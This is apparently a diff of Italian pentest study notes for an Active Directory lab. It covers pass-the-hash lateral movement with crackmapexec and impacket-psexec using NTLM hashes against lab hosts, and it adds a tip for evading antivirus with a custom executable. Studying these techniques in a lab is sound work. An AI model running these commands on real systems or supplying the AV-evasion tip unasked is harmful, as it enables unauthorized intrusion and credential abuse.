@@ -239,8 +239,9 @@ crackmapexec smb 192.168.56.10-23 -u Administrator -H 'dbd13e1c4e338284ac4e9874f
 *Con Impacket*
 è possibile utilizzare sia gli hash (-hashes) che le key (-key <aes128 or aes256 key>)
 - PsExec
-Funziona uploadando un exe e creandoci un servizio. Usa smb
+Funziona uploadando un exe e creandoci un servizio. Usa smb.
 ```bash
-psexec -hashes 'cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@192.168.56.11
+impacket-psexec -hashes 'cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@192.168.56.11
 ```
-Normalmente flaggato da AV. Per bypass
+Normalmente flaggato da AV. Per bypass creare un exe custom e passarlo con -file
+![[Pasted image 20230907161746.png]]
